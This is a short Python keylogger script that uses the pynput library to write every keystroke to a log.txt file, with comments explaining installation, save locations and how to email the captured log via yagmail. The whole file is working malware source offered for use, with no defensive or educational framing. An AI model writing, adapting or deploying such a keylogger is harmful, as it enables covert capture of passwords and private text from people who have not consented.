#pip install pynput OR python3 -m pip install pynput
#ONLY ONE MODULE REQUIRED
from pynput.keyboard import Listener #add ", Key" here if you want to be able to act when keys like Enter and esc are pressed)
#you can use the yagmail python module to email yourself the log with a gmail account when a key is pressed (if key.char == ... OR if key=Key.(esc, enter, shift))
file = open("log.txt", "a") #save to the current directory. To save to another location use r'C:\Users\k\t\m\etc\log.txt'
#NOTE - it does not matter if "log.txt" exists or not. Python will automatically create that file.
def on_press(key):
  try:
    file.write(f'\n{key}')
    file.flush() #save changes
  except:
    pass #ignore all errors
listener = Listener(on_press=on_press) #you can also use "with listener as Listener(on_press...):"
listener.start()
listener.join()